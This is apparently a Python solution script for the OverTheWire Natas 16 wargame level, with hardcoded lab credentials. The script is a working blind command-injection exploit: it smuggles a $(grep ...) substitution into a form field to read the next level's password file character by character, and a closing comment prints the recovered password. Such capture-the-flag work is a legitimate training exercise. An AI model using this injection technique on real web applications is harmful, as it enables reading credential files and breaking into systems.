import requests
from string import *

username="natas16"
password='WaIHEacj63wnNIBROHeqi3p9t0m5nhmh'
url='http://natas16.natas.labs.overthewire.org'

characters=uppercase+lowercase+digits;

session=requests.Session()

passwordb=list('');

while True :
    for ch in characters :
        pas="".join(passwordb)
        print "current password : " , pas+ch
        pas=pas+ch
        response=session.post(url,data={"needle" : "anythings$(grep ^"+pas+" /etc/natas_webpass/natas17)"} ,auth=(username,password))
        content=response.text
        if   "anythings" not in content :
               passwordb.append(ch)



#current password :  8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cwp
